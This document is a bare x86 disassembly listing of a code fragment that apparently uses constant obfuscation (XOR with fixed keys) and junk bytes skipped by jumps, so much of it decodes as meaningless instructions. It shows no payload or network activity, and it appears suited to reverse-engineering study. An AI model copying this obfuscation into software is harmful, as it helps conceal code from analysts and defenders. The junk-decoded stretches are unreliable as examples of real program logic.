  40c023:	fsub   QWORD PTR [ebx]
  40c025:	fbstp  TBYTE PTR [edi-0x7c]
  40c028:	imul   ebp,DWORD PTR [edi-0x50c57d5],0xf0f2e57e
  40c032:	jno    0x40bffb
  40c034:	pop    esp
  40c035:	pop    eax
  40c036:	sub    al,0xc1
  40c038:	sub    bl,BYTE PTR [ebp+0x29]
  40c03b:	push   edx
  40c03c:	nop
  40c03d:	fisubr DWORD PTR [edi+eax*4-0x34]
  40c041:	sub    BYTE PTR [ebp-0x74af1ea8],dh
  40c047:	adc    DWORD PTR [ebx+0x64],ebx
  40c04a:	push   esp
  40c04b:	pop    esi
  40c04c:	lods   al,BYTE PTR ds:[esi]
  40c04d:	dec    eax
  40c04e:	xchg   ebx,eax
  40c04f:	aaa    
  40c050:	jns    0x40c09c
  40c052:	jl     0x40c026
  40c054:	mov    dh,0xdd
  40c056:	repnz mov bh,0xba
  40c059:	ss ss clc 
  40c05c:	cwde   
  40c05d:	popa   
  40c05e:	jnp    0x40c06d
  40c060:	shr    BYTE PTR [ebx],1
  40c062:	inc    ebx
  40c063:	pusha  
  40c064:	adc    eax,0x8e39b976
  40c069:	adc    BYTE PTR [edi-0x70485b05],dl
  40c06f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c070:	cdq    
  40c071:	push   ss
  40c072:	jno    0x40c05d
  40c074:	inc    esi
  40c075:	ror    DWORD PTR [ebx],0x47
  40c078:	pop    edx
  40c079:	push   edi
  40c07a:	mov    eax,ds:0xc3a91aab
  40c07f:	adc    bl,ah
  40c081:	mov    ecx,0x7510859
  40c086:	xor    edx,edx
  40c088:	xor    edi,ecx
  40c08a:	mov    esi,0x32729f
  40c08f:	add    edi,esi
  40c091:	div    edi
  40c093:	mov    edx,DWORD PTR [ebp-0x4]
  40c096:	xor    edx,ecx
  40c098:	lea    eax,[edx+eax*1+0x32729f]
  40c09f:	mov    edx,DWORD PTR [ebp+0x8]
  40c0a2:	mov    edi,DWORD PTR [ebp-0x24]
  40c0a5:	mov    DWORD PTR [edi+edx*4],eax
  40c0a8:	mov    eax,DWORD PTR [ebp-0x18]
  40c0ab:	mov    edx,DWORD PTR [ebp+0x8]
  40c0ae:	xor    eax,ecx
  40c0b0:	lea    eax,[eax+edx*1+0x32729f]
  40c0b7:	mov    DWORD PTR [ebp+0x8],eax
  40c0ba:	mov    eax,DWORD PTR [ebp-0x18]
  40c0bd:	mov    edx,DWORD PTR [ebp+0x14]
  40c0c0:	xor    eax,ecx
  40c0c2:	add    eax,esi
  40c0c4:	imul   eax,DWORD PTR [edx]
  40c0c7:	mov    edx,DWORD PTR [ebp-0x4]
  40c0ca:	xor    edx,ecx
  40c0cc:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0cf:	jmp    0x40c1b4
  40c0d4:	mov    ebx,0x61b1c335
  40c0d9:	pop    ecx
  40c0da:	mov    ecx,0x5c6a2de5
  40c0df:	xchg   edi,eax
  40c0e0:	mov    ebx,0xe19411ba
  40c0e5:	xor    eax,0x7eb67e7e
  40c0ea:	jle    0x40c16a
  40c0ec:	shrd   DWORD PTR [esi+0x35],edx,0x1f
  40c0f1:	and    al,0x59
  40c0f3:	(bad)  
  40c0f4:	mov    edi,ecx
  40c0f6:	int3   
  40c0f7:	mov    eax,0x8ad4a7fa
  40c0fc:	popf   
  40c0fd:	call   0xe8c5:0xe9c1df96
  40c104:	lods   al,BYTE PTR ds:[esi]
  40c105:	xchg   ebp,eax
  40c106:	in     eax,dx
  40c107:	pop    eax
  40c108:	daa    
  40c109:	push   ss
  40c10a:	mov    esp,0x7ed96a65
  40c10f:	test   DWORD PTR [ecx+edi*4],edx
  40c112:	cmovo  edx,edi
  40c115:	(bad)
  40c118:	dec    ecx
  40c119:	xchg   BYTE PTR [ecx],dh
  40c11b:	test   BYTE PTR [edi+0x3e],bh
  40c11e:	(bad)  
  40c11f:	cmp    eax,0x21ae144d
  40c124:	mov    edx,DWORD PTR [ebx+0x49]
  40c127:	cwde   
  40c128:	loope  0x40c145
  40c12a:	out    0x4,eax
  40c12c:	or     al,0x30
  40c12e:	sbb    BYTE PTR [eax],0xc2
  40c131:	popa   
  40c132:	xchg   edi,eax
  40c133:	sbb    eax,ebx
  40c135:	push   esi
  40c136:	mov    ebx,0x3b2e3fb9
  40c13b:	dec    eax
  40c13c:	add    ebx,esp
  40c13e:	jb     0x40c170
  40c140:	mov    eax,ds:0x405387a5
  40c145:	test   esp,edx
  40c147:	leave  
  40c148:	and    al,0x70
  40c14a:	add    DWORD PTR [ebx-0x5efe1343],esp
  40c150:	mov    WORD PTR [edx-0x32],ss
  40c153:	cdq    
  40c154:	(bad)  
  40c155:	adc    BYTE PTR [ebx-0x18],dh
  40c158:	dec    edx
  40c159:	test   DWORD PTR [edx+0x55],eax
  40c15c:	lock mov al,0x77
  40c15f:	lods   al,BYTE PTR ds:[esi]
  40c160:	repz mov edi,0xe83557f2
  40c166:	xchg   edx,eax
  40c167:	call   0x1fcf:0x666999d7
  40c16e:	ins    DWORD PTR es:[edi],dx
  40c16f:	fistp  QWORD PTR [esi]
  40c171:	jbe    0x40c1cd
  40c173:	fnsave [eax-0x1bb7b21a]
  40c179:	xlat   BYTE PTR ds:[ebx]
  40c17a:	xor    DWORD PTR [ebp+0x78],ebp
  40c17d:	ds push es
  40c17f:	xchg   esi,eax
  40c180:	or     esi,DWORD PTR [ecx-0x5e72f228]
  40c186:	pop    eax
  40c187:	mov    ds:0xaaba600b,eax
  40c18c:	(bad)  
  40c18d:	ins    BYTE PTR es:[edi],dx
  40c18e:	push   ebx
  40c18f:	lahf   
  40c190:	mov    edx,DWORD PTR [ebp-0x55]
  40c193:	jo     0x40c124
  40c195:	jno    0x40c173
  40c197:	or     BYTE PTR [edi+0x228bc562],0x58
  40c19e:	and    dl,BYTE PTR fs:[edi+0x74]
  40c1a2:	push   0xfffffffd
  40c1a4:	push   ecx
  40c1a5:	scas   al,BYTE PTR es:[edi]
  40c1a6:	push   0xf880dc97
  40c1ab:	mov    BYTE PTR [ebx],bl
  40c1ad:	int    0x83
  40c1af:	scas   al,BYTE PTR es:[edi]
  40c1b0:	daa    
  40c1b1:	psadbw mm7,QWORD PTR [edi]
  40c1b4:	lea    ecx,[edx+ecx*1+0x32729f]
  40c1bb:	cmp    ecx,eax
  40c1bd:	jne    0x40bf8f
  40c1c3:	mov    ebx,esi
  40c1c5:	jmp    0x40c2b4
  40c1ca:	mov    ebx,0x32729f
  40c1cf:	jmp    0x40c2b4
  40c1d4:	mov    al,0x75
  40c1d6:	or     eax,0x598459f4
  40c1db:	leave  
  40c1dc:	jns    0x40c1f9
  40c1de:	or     ah,BYTE PTR [ecx+0x1d221868]
  40c1e4:	cmp    edx,ecx
  40c1e6:	jle    0x40c266
  40c1e8:	mov    dh,0x7e
  40c1ea:	jle    0x40c26a
  40c1ec:	jecxz  0x40c228
  40c1ee:	push   esi
  40c1ef:	je     0x40c17e
  40c1f1:	xlat   BYTE PTR ds:[ebx]
  40c1f2:	inc    edi
  40c1f3:	iret   
  40c1f4:	je     0x40c225
  40c1f6:	adc    bl,BYTE PTR [ebx-0x2c2616a]
  40c1fc:	cs scas al,BYTE PTR es:[edi]
  40c1fe:	loopne 0x40c19b
  40c200:	not    DWORD PTR [eax]
  40c202:	in     al,0xe6
  40c204:	mov    WORD PTR [ecx],?
  40c206:	inc    esp
  40c207:	mov    al,0xd3
  40c209:	mov    ebp,0x71a22aa4
  40c20e:	jmp    0xd3cc:0x30277cb7
  40c215:	cmp    eax,0xe0069c4a
  40c21a:	popa   
  40c21b:	loop   0x40c1cd
  40c21d:	mov    esp,0xdd8b3efc
  40c222:	jbe    0x40c1b1
  40c224:	(bad)  
  40c225:	(bad)  
  40c227:	and    dh,BYTE PTR [eax+0x3]
  40c22a:	ror    BYTE PTR [ebx],0x97
  40c22d:	and    BYTE PTR [edi],0xea
  40c230:	fwait
  40c231:	push   esp
  40c232:	mov    bl,0x51
  40c234:	dec    edx
  40c235:	cmp    BYTE PTR [esp+esi*4],bh
  40c238:	add    eax,eax
  40c23a:	pop    ecx
  40c23b:	xor    bl,0x43
  40c23e:	xchg   ebx,eax
  40c23f:	inc    ebx
  40c240:	adc    esi,DWORD PTR [ebx+eax*1]
  40c243:	retf   0x8016
  40c246:	je     0x40c26f
  40c248:	push   edx
  40c249:	xor    esp,DWORD PTR [esi+edx*1-0x54]
  40c24d:	out    dx,al
  40c24e:	imul   ebp,DWORD PTR [ebx-0x3b29a571],0x80f7f4fd
  40c258:	cmp    eax,0x8b9a8b98
  40c25d:	cmp    ebp,ebx
  40c25f:	jl     0x40c290
  40c261:	mul    BYTE PTR ss:[eax]
  40c264:	push   es
  40c265:	mov    eax,0x1da23641
  40c26a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c26b:	nop
  40c26c:	pop    es
  40c26d:	push   0xffffffc7
  40c26f:	mov    gs,WORD PTR [edx]
  40c271:	dec    esi
  40c272:	mov    bl,0x61
  40c274:	xchg   DWORD PTR [ebp+0x46],edi
  40c277:	loopne 0x40c2b5
  40c279:	loope  0x40c2aa
  40c27b:	nop
  40c27c:	retf   0xc645
  40c27f:	xchg   esi,eax
  40c280:	repnz addr16 mov dh,0x87
  40c284:	lds    ebp,FWORD PTR [edi+0x0]
  40c287:	(bad)  
  40c288:	mov    al,0x2e
  40c28a:	cmp    al,ch
  40c28c:	pop    edx
  40c28d:	jb     0x40c2f0
  40c28f:	jg     0x40c216
  40c291:	iret   
  40c292:	std    
  40c293:	fs (bad) 
  40c295:	rcr    BYTE PTR [ecx],cl
  40c297:	fbld   TBYTE PTR [edi-0x27]
  40c29a:	add    ebp,ecx
  40c29c:	adc    eax,0x5f526a3a
  40c2a1:	or     BYTE PTR [ebp-0xb],ch
  40c2a4:	pop    ecx
  40c2a5:	pop    es
  40c2a6:	add    eax,DWORD PTR [edi-0x1da1102d]
  40c2ac:	lods   eax,DWORD PTR ds:[esi]
  40c2ad:	jbe    0x40c259
  40c2af:	jns    0x40c247
  40c2b1:	xchg   BYTE PTR [ecx-0x3ba74b7],dh
  40c2b7:	xor    eax,0x7510859
  40c2bc:	add    eax,ebx
  40c2be:	mov    DWORD PTR [ebp-0xc],eax
  40c2c1:	xor    ebx,ebx
  40c2c3:	lea    eax,[ebp-0x10]
  40c2c6:	add    ebx,DWORD PTR [eax]
  40c2c8:	jmp    0x40c3ad
  40c2cd:	sbb    al,0xbe
  40c2cf:	cmp    al,0xc2
  40c2d1:	pop    esp
  40c2d2:	inc    eax
  40c2d3:	and    BYTE PTR [eax+0x3b],ah
  40c2d6:	gs xchg edx,ebp
  40c2d9:	outs   dx,DWORD PTR ds:[esi]
  40c2da:	loope  0x40c2eb
  40c2dc:	pop    edx
  40c2dd:	jno    0x40c2aa
  40c2df:	jle    0x40c35f
  40c2e1:	mov    dh,0x7e
  40c2e3:	jle    0x40c363
  40c2e5:	jmp    0x45fc:0x200aef64
  40c2ec:	mov    bl,0x84
  40c2ee:	cmp    al,BYTE PTR [edx]
  40c2f0:	std    
  40c2f1:	loop   0x40c341
  40c2f3:	push   edi
  40c2f4:	or     BYTE PTR [edx+0xf],bh
  40c2f7:	mov    ?,WORD PTR ss:[esi+0x7d43a6e5]
  40c2fe:	das    
  40c2ff:	int3   
  40c300:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c301:	xor    BYTE PTR [edi+0x17bba4f9],bl
  40c307:	adc    BYTE PTR [edi-0x40],bl
  40c30a:	cld    
  40c30b:	xchg   edx,eax
  40c30c:	(bad)  
  40c30d:	shl    DWORD PTR [ecx],1
  40c30f:	mov    ebx,es
  40c311:	(bad)  
  40c312:	in     al,dx
  40c313:	xchg   edx,eax
  40c314:	push   ecx
  40c315:	mov    DWORD PTR [ecx],esi
  40c317:	out    dx,eax
  40c318:	gs ins DWORD PTR es:[edi],dx
  40c31a:	push   ebx
  40c31b:	cli    
  40c31c:	je     0x40c33e
  40c31e:	dec    esp
  40c31f:	dec    esp
  40c320:	daa    
  40c321:	ret    
  40c322:	push   0x6024a039
  40c327:	add    BYTE PTR [ebx+0x817f50c],dl
  40c32d:	and    DWORD PTR [esi+0x16],esi
  40c330:	push   ebp
  40c331:	(bad)  
  40c332:	add    al,0x80
  40c334:	nop
  40c335:	ins    BYTE PTR es:[edi],dx
  40c336:	(bad)  
  40c337:	add    DWORD PTR [ebp+0x5d54c440],esp
  40c33d:	jp     0x40c2d0
  40c33f:	cmp    eax,0xe17c796f
  40c344:	cmp    DWORD PTR [edi+0x16],0xc12e812d
  40c34b:	inc    ebp
  40c34c:	push   edx
  40c34d:	dec    DWORD PTR [ebx]
  40c34f:	cmp    DWORD PTR [eax],ebx
  40c351:	mov    al,0xa6
  40c353:	test   DWORD PTR [ecx],ecx
  40c355:	mov    ebp,0x71fa1c7d
  40c35a:	inc    ecx
  40c35b:	push   ebx
  40c35c:	pop    ebp
  40c35d:	or     eax,0xedac6486
  40c362:	and    eax,0x76c10677
  40c367:	xchg   esi,eax
  40c368:	sbb    ecx,DWORD PTR [eax+0xe]
  40c36b:	jmp    0x40b4afe3
  40c370:	stos   BYTE PTR es:[edi],al
  40c371:	and    al,0x6a
  40c373:	dec    edi
  40c374:	aad    0xe
  40c376:	mov    dl,ah
  40c378:	xchg   ebx,eax
  40c379:	jecxz  0x40c39d
  40c37b:	jmp    0x1f4b3610
  40c380:	cmp    BYTE PTR [ebp-0x43760c8f],bh
  40c386:	fucomp st(5)
  40c388:	and    al,0x27
  40c38a:	repz fsub QWORD PTR [ebp-0x789fa42b]
  40c391:	pop    ecx
  40c392:	cmc    
  40c393:	test   BYTE PTR [eax+0x22],dl
  40c396:	ins    BYTE PTR es:[edi],dx
  40c397:	inc    esi
  40c398:	push   eax
  40c399:	retf   0xb79c
  40c39c:	mov    bl,0x73
  40c39e:	sahf   
  40c39f:	lock and edx,edx
  40c3a2:	dec    edx
  40c3a3:	hlt    
  40c3a4:	pop    ebp
  40c3a5:	popa   
  40c3a6:	xor    ah,BYTE PTR [eax]
  40c3a8:	daa    
  40c3a9:	dec    esi
  40c3aa:	andnps xmm3,XMMWORD PTR [eax-0x24cc2c01]
  40c3b1:	jmp    0x40c496
  40c3b6:	popa   
  40c3b7:	jno    0x40c409
  40c3b9:	jnp    0x40c41b
  40c3bb:	jnp    0x40c436
  40c3bd:	or     DWORD PTR ds:0x202e5fee,ecx
  40c3c3:	pushf  
  40c3c4:	outs   dx,BYTE PTR ds:[esi]
  40c3c5:	inc    esi
  40c3c6:	dec    ecx
  40c3c7:	retf   
  40c3c8:	jle    0x40c448
  40c3ca:	mov    dh,0x7e
  40c3cc:	jle    0x40c44c
  40c3ce:	dec    esp
  40c3cf:	mov    bl,0xfe
  40c3d1:	mov    edi,0x9f9b2853
  40c3d6:	fcmovb st,st(0)
  40c3d8:	inc    esp
  40c3d9:	dec    esi
  40c3da:	ud1    ecx,DWORD PTR [eax-0x75]
  40c3de:	xchg   ebp,eax
  40c3df:	outs   dx,BYTE PTR ds:[esi]
  40c3e0:	imul   esp,DWORD PTR es:[ebx-0x13],0xffffffe9
  40c3e5:	ret    0x9bf0
  40c3e8:	out    dx,al
  40c3e9:	push   cs
  40c3ea:	xchg   ebp,eax
  40c3eb:	mov    ebx,0x238c1514
  40c3f0:	xchg   BYTE PTR [ecx-0xe],cl
  40c3f3:	inc    esp
  40c3f4:	or     cl,al
  40c3f6:	pop    edi
  40c3f7:	pop    ss
  40c3f8:	fwait
  40c3f9:	push   esi
  40c3fa:	mov    dl,0x9f
  40c3fc:	rcr    BYTE PTR [eax],1
  40c3fe:	mov    dh,0xfd
  40c400:	stos   DWORD PTR es:[edi],eax
  40c401:	ins    BYTE PTR es:[edi],dx
  40c402:	(bad)  
  40c403:	push   ebx
  40c404:	pusha  
  40c405:	aas    
  40c406:	xor    eax,0x91f0881
  40c40b:	ret    
  40c40c:	jbe    0x40c3f2
  40c40e:	test   DWORD PTR [esi-0x2a24bf87],edx
  40c414:	push   ds
  40c415:	xor    ebp,DWORD PTR [eax]
  40c417:	mov    ds:0x451bf3b2,eax
  40c41c:	push   ebx
  40c41d:	retf   0xeed5
  40c420:	inc    ebp
  40c421:	or     ah,dh
  40c423:	and    DWORD PTR [ecx],esi
  40c425:	mov    ds:0x1a4be921,al
  40c42a:	js     0x40c454
  40c42c:	or     eax,DWORD PTR [esi+0x15cbb02e]
  40c432:	pop    edi
  40c433:	shr    BYTE PTR [ebx-0x11fc396e],1
  40c439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c43a:	aas    
  40c43b:	xchg   edi,eax
  40c43c:	aad    0xc5
  40c43e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c43f:	pop    ebp
  40c440:	mov    BYTE PTR [edx+0x12045cd8],dl
  40c446:	call   0xc797:0x877754b
  40c44d:	mov    eax,0x1b8a2c27
  40c452:	mov    cl,0xc1
  40c454:	fnstsw WORD PTR [ebx]
  40c456:	test   al,0xc7
  40c458:	test   DWORD PTR [ecx],esp
  40c45a:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c45c:	int    0x40
  40c45e:	lods   al,BYTE PTR ds:[esi]
  40c45f:	add    ch,BYTE PTR [edi+0x520f8d94]
  40c465:	cli    
  40c466:	push   0xb72808ba
  40c46b:	mov    cl,0x7e
  40c46d:	inc    ebp
  40c46e:	mov    eax,ss
  40c470:	jmp    0x68aadd92
  40c475:	fdiv   DWORD PTR [esi]
  40c477:	(bad)  
  40c479:	and    bl,BYTE PTR [edi]
  40c47b:	xor    ch,BYTE PTR [edi]
  40c47d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c47e:	in     eax,dx
  40c47f:	and    al,0xb1
  40c481:	out    0x34,eax
  40c483:	sub    BYTE PTR [ecx+0x5e975134],0x48
  40c48a:	pop    esp
  40c48b:	jnp    0x40c4e4
  40c48d:	pop    edx
  40c48e:	gs adc al,0x7b
  40c491:	xor    DWORD PTR [eax-0x46],0x53
  40c495:	jb     0x40c4da
  40c497:	cmp    DWORD PTR [ebp+0x10],ebx
  40c49a:	jmp    0x40c57f
  40c49f:	test   al,0xfc
  40c4a1:	xchg   esi,eax
  40c4a2:	push   esi
  40c4a3:	stos   BYTE PTR es:[edi],al
  40c4a4:	push   esp
  40c4a5:	push   0xe4b270b0
  40c4aa:	gs sub ch,cl
  40c4ad:	aam    0xe2
  40c4af:	or     eax,0x7eb67e7e
  40c4b5:	jle    0x40c535
  40c4b7:	and    edi,ebp
  40c4b9:	pop    edx
  40c4ba:	push   esi
  40c4bb:	pop    ebp
  40c4bc:	pop    eax
  40c4bd:	mov    ds:0x97526c3a,al
  40c4c2:	cmp    eax,0x28c0f351
  40c4c7:	test   BYTE PTR [edi+0x5bed7921],cl
  40c4cd:	pmovmskb esp,mm2
  40c4d0:	gs xchg ecx,eax
  40c4d2:	sub    eax,0x89f1b84d
  40c4d7:	adc    ch,BYTE PTR [ecx]
  40c4d9:	adc    ecx,DWORD PTR [edx]
  40c4db:	loop   0x40c494
  40c4dd:	out    dx,eax
  40c4de:	jmp    0x40c4a0
  40c4e0:	xchg   BYTE PTR [eax+esi*2],ch
  40c4e3:	js     0x40c52c
  40c4e5:	call   0x47e:0x443f9db1
  40c4ec:	and    DWORD PTR [ebx+0x5648531c],ecx
  40c4f2:	enter  0x2f65,0x2a
  40c4f6:	lahf   
  40c4f7:	jecxz  0x40c525
  40c4f9:	mov    al,ds:0x9900c1d1
  40c4fe:	data16 fs in al,dx
  40c501:	fdivr  QWORD PTR [esi-0xd3af659]
  40c507:	sbb    al,0x78
  40c509:	int    0x49
  40c50b:	sbb    al,0xbf
  40c50d:	adc    ebp,DWORD PTR [ebx]
  40c50f:	pop    edi
  40c510:	jnp    0x40c4a1
  40c512:	cmp    eax,0x95023b73
  40c517:	jl     0x40c578
  40c519:	xlat   BYTE PTR ds:[ebx]
  40c51a:	jmp    0x57929ad8
  40c51f:	mov    dl,BYTE PTR [esi]
  40c521:	and    eax,0x16ea4a49
  40c526:	das    
  40c527:	xor    DWORD PTR [edi+0x6a],ebx
  40c52a:	pop    ss
  40c52b:	test   al,0xc4
  40c52d:	out    0xf7,eax
  40c52f:	pop    edx
  40c530:	popa   
  40c531:	add    BYTE PTR [edi],dl
  40c533:	pusha  
  40c534:	or     DWORD PTR [ebx],ecx
  40c536:	pop    ds
  40c537:	mov    esi,0xecd99555
  40c53c:	mov    edi,0x857ebbda
  40c541:	xlat   BYTE PTR ds:[ebx]
  40c542:	loop   0x40c587
  40c544:	and    edi,edi
  40c546:	cmc    
  40c547:	add    al,BYTE PTR [eax-0x6fc5a824]
  40c54d:	and    bh,BYTE PTR [edx+0x3c]
  40c550:	(bad)  [ecx]
  40c552:	jg     0x40c570
  40c554:	cli    
  40c555:	sbb    eax,0x50a58f81
  40c55a:	xchg   esp,eax
  40c55b:	call   0xf605de69
  40c560:	test   al,0x75
  40c562:	fldcw  WORD PTR [esi+0x9]
  40c565:	xchg   edi,eax
  40c566:	push   0xfffffffb
  40c568:	dec    eax
  40c569:	mov    bl,0x11
  40c56b:	and    al,0xb3
  40c56d:	sbb    al,0xf3
  40c56f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c570:	ss stos DWORD PTR es:[edi],eax
  40c572:	cli    
  40c573:	mov    al,ds:0xc42782ca
  40c578:	dec    esp
  40c579:	mov    WORD PTR [edx],?
  40c57b:	mov    ds:0xfe71338,al
  40c580:	test   ch,bh
  40c582:	add    BYTE PTR [eax],al
  40c584:	add    BYTE PTR [edx+0x6a590a6a],dl
  40c58a:	add    al,0x5b
  40c58c:	inc    ebx
  40c58d:	xchg   ebx,ecx
  40c58f:	sub    ebx,ecx
  40c591:	xchg   ebx,ecx
  40c593:	jmp    0x40c678
  40c598:	xchg   DWORD PTR [eax+0x3d],ebx
  40c59b:	out    0x31,al
  40c59d:	jnp    0x40c544
  40c59f:	jns    0x40c5e7
  40c5a1:	add    al,0x4b
  40c5a3:	call   0xaf0c748d
  40c5a8:	fxch   st(1)
  40c5aa:	jle    0x40c62a
  40c5ac:	mov    dh,0x7e
  40c5ae:	jle    0x40c62e
  40c5b0:	inc    esp
  40c5b1:	mov    ch,0x7a
  40c5b3:	pop    ebx
  40c5b4:	out    0x63,al
  40c5b6:	enter  0x4b23,0x2a
  40c5ba:	adc    dh,BYTE PTR [edi]
  40c5bc:	sub    eax,0xc20cb1d0
  40c5c1:	int    0x87
  40c5c3:	sbb    dl,BYTE PTR [edi-0x58f32c1f]
  40c5c9:	sub    al,0x44
  40c5cb:	outs   dx,BYTE PTR ds:[esi]
  40c5cc:	fcmovnu st,st(5)
  40c5ce:	loope  0x40c58b
  40c5d0:	aam    0xfe
  40c5d2:	push   es
  40c5d3:	jmp    0xd9918ea0
  40c5d8:	in     al,dx
  40c5d9:	jg     0x40c622
  40c5db:	jmp    0x78d25f7a
  40c5e0:	jbe    0x40c652
  40c5e2:	in     eax,dx
  40c5e3:	sbb    al,0xb8
  40c5e5:	push   cs
  40c5e6:	test   bh,dh
  40c5e8:	popf   
  40c5e9:	inc    edx
  40c5ea:	test   eax,0xdbc69e19
  40c5ef:	call   0xe642d98c
  40c5f4:	dec    ebx
  40c5f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5f6:	mov    ch,0x8a
  40c5f8:	outs   dx,DWORD PTR ds:[esi]
  40c5f9:	pop    es
  40c5fa:	push   ss
  40c5fb:	ror    DWORD PTR [ebx-0x34],cl
  40c5fe:	(bad)  
  40c5ff:	cmp    ah,BYTE PTR [ecx-0x78]
  40c602:	jmp    0x6bf4f89e
  40c607:	arpl   WORD PTR [ebx+0x71],ax
  40c60a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c60b:	iret   
  40c60c:	jbe    0x40c60b
  40c60e:	adc    eax,0xce990772
  40c613:	push   cs
  40c614:	jne    0x40c687
  40c616:	push   ebp
  40c617:	hlt    
  40c618:	jle    0x40c5ef
  40c61a:	stos   BYTE PTR es:[edi],al
  40c61b:	jns    0x40c5a9
  40c61d:	lds    esi,FWORD PTR [edi-0x47e6019e]
  40c623:	push   ebx
  40c624:	push   ds
  40c625:	dec    edi
  40c626:	fwait
  40c627:	out    dx,eax
  40c628:	pushf  
  40c629:	out    dx,eax
  40c62a:	out    dx,al
  40c62b:	xor    al,0xec
  40c62d:	daa    
  40c62e:	ffree  st(7)
  40c630:	es cdq 
  40c632:	sbb    al,0xdb
  40c634:	jae    0x40c675
  40c636:	mov    ah,0x74
  40c638:	imul   esp,edx,0xffffffb8
  40c63b:	ret    
  40c63c:	mov    edx,0x38c47402
  40c641:	sbb    bl,ch
  40c643:	add    al,ah
  40c645:	iret   
  40c646:	mov    dh,0x60
  40c648:	xor    DWORD PTR ss:[esi],esp
  40c64b:	retf   0x32ad
  40c64e:	xchg   ecx,eax
  40c64f:	push   edi
  40c650:	mov    esi,0x3e35d372
  40c655:	and    BYTE PTR [ebx+0x5a8b92c7],ah
  40c65b:	xor    edx,ecx
  40c65d:	mov    eax,0x4190d340
  40c662:	dec    ebx
  40c663:	pop    ss
  40c664:	sbb    dl,BYTE PTR [ebp+0x52]
  40c667:	(bad)  
  40c668:	push   0xc8ca90ba
  40c66d:	clc    
  40c66e:	jge    0x40c6b1
  40c670:	xchg   edi,eax
  40c671:	popa   
  40c672:	xor    esi,DWORD PTR [edi]
  40c674:	cmp    esi,edi
  40c676:	inc    edx
  40c677:	or     BYTE PTR [ecx-0x75],cl
  40c67a:	inc    ebp
  40c67b:	in     al,0xf
  40c67d:	scas   eax,DWORD PTR es:[edi]
  40c67e:	rol    DWORD PTR [ebx],0xe0
  40c681:	xchg   edx,eax
  40c682:	push   eax
  40c683:	xor    ebx,ebx
  40c685:	mov    edx,esp
  40c687:	dec    edx
  40c688:	inc    ebx
  40c689:	add    ebx,DWORD PTR [edx+ebx*1]
  40c68c:	dec    ebx
  40c68d:	xor    edx,edx
  40c68f:	add    DWORD PTR [ebp-0xc],ebx
  40c692:	pop    ebx
  40c693:	mov    eax,DWORD PTR [ebp-0xc]
  40c696:	pop    edi
  40c697:	pop    esi
  40c698:	pop    ebx
  40c699:	leave  
  40c69a:	ret    0x10
